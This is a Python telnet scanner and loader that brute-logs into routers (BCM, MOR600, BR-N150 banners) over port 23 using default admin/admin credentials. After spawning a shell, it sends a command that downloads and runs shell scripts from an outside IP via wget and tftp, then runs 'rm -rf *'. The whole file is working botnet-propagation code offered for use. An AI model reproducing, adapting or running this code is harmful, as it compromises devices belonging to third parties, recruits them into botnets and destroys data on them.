#!/usr/bin/python
# BCM Scanner / By; LiGhT

import threading, sys, time, random, socket, re, os

if len(sys.argv) < 2:
        print "Usage: python "+sys.argv[0]+" <list>"
        sys.exit()

ips = open(sys.argv[1], "r").readlines()
username = "admin"
password = "admin"
cmd = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.54.59.97/qwe.sh; chmod 777 qwe.sh; sh qwe.sh; tftp 103.54.59.97 -c get adsw1.sh; chmod 777 adsw1.sh; sh adsw1.sh; tftp -r adqw2.sh -g 103.54.59.97; chmod 777 adqw2.sh; sh adqw2.sh; rm -rf *"
spawn_shell = "cat | sh"
count = 0
def readUntil(tn, string, timeout=15):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.01)
        if string in buf: return buf
    raise Exception('TIMEOUT!')

class BCMM(threading.Thread):
        def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
        def run(self):
		try:
			tn = socket.socket()
			tn.settimeout(5)
			tn.connect((self.ip,23))
		except Exception:
			time.sleep(0.01)
		try:
			time.sleep(0.01)
			hoho = ''
			hoho += readUntil(tn, ":")
			if  "BCM" in hoho:
				tn.send(username + "\n")
				print "[%s] sending root user"%(self.ip)
			elif "MOR600" in hoho: #non-root
				tn.send(username + "\n")
				print "[%s] sending non-root user"%(self.ip)
			elif "BR-N150" in hoho: #root
				tn.send(username + "\n")
				print "[%s] sending 3 user"%(self.ip)
		except Exception:
			time.sleep(0.01)
		try:
			hoho = ''
			hoho += readUntil(tn, ":")
			if "assword" in hoho:
				tn.send(password + "\n")
				time.sleep(3)
		except Exception:
			time.sleep(0.01)
		try:
			mp = ''
			mp += tn.recv(1024)
			if "#" in mp or "$" in mp or ">" in mp:
				tn.send(spawn_shell + "\n")
				time.sleep(1)
				tn.send(cmd + "\n")
				print "\033[32m[%s] command sent %s!\033[37m"%(count, self.ip)
				time.sleep(10)
				tn.close()				
		except Exception:
			tn.close()
for ip in ips:
	try:
		count += 1
		t = BCMM(ip)
		t.start()
		time.sleep(0.02)
	except:
		pass
